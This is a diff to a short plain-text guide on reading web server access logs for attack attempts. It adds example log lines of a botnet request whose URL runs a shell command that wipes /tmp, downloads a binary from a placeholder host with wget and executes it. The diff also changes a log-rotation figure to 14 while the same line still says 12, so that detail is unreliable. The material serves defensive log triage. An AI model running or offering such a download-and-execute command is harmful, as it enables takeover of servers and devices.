@@ -34,13 +34,20 @@ http code 2xx and working .inc tag, so attacker successfully includes something 
 http code 2xx and working .install tag, so attacker has access to installing to your server = VERY BAD
 http code 2xx and POST, If the server does not have file storage function and attacker uses post successfully. = GENERALLY BAD
 
+EXAMPLE OF GOOD LOG:
+[TIME] "GET /shell?cd+/tmp;+rm+-rf+*;+wget+http://IP/arm7;+chmod+777+arm7;+./arm7+rep.arm7 HTTP/1.0" 404 537 "-" "botnet/2.0"
+
+EXAMPLE OF BAD LOG:
+[TIME] "GET /shell?cd+/tmp;+rm+-rf+*;+wget+http://IP/arm7;+chmod+777+arm7;+./arm7+rep.arm7 HTTP/1.0" 200 238 "-" "botnet/2.0"
+
 HTTP status codes simplified
 2xx - OK WORKING
 3xx - REDIRECT
 4xx - NOT FOUND
 5xx - SERVER ERRORS
 
-Google cloud server has log rotation of 12 by default = logs deletes after 12 duplicates, 1day = new logfile.
+Google cloud server has log rotation of 14 by default = logs deletes after 12 duplicates, 1day = new logfile.
+Rotate file found at $ cat /etc/logrotate.d/apache2
 ________________________________________________________________________________________________________________________________
 ** Web searching log files **
 Google can search for files with functions inurl and filetype:
